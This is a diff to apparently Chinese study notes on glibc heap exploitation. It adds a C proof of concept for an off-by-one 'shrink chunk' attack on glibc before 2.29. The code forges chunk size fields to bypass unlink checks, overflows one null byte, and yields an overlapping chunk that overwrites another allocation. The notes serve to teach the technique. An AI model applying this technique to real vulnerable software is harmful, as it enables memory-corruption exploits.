@@ -884,7 +884,38 @@ off by one 是与size相关的攻击。
 1. 减小释放后chunk的size
 
 ![[shrink chunk.png]]
+下面是示例加大了b来绕过tcache
+```c
+#include<stdlib.h>
+#include<stdio.h>
+#include<string.h>
+int main(int argc, char const *argv[])
+{
+    printf("off by one in glibc <2.29\n");
+    char *a=malloc(0x108);
+    char *b=malloc(0x500);
+    char *c=malloc(0x500);
+    //bypss malloc b1 -> unlink check
+    *(size_t *)(b+0x4f0)=0x500;
+    free(b);
+    // overflow to b->size
+    *(a+0x108)=0;
+    char *b1=malloc(0x410);
+    // bypass free(c) -> unlink check
+    *(size_t *)(b1+0x408)=0x420;
+    char *b2=malloc(0x20);
+    strcpy(b2,"please change me!");
+    free(b1);
+    free(c);
+    
+    char *evil=malloc(0x500);
+    printf("b2:%s\n",b2);
+    strcpy(evil+0x420,"hahahahahahaha");
+    printf("b2:%s\n",b2);
+    return 0;
+}
 
+```
 
 
 
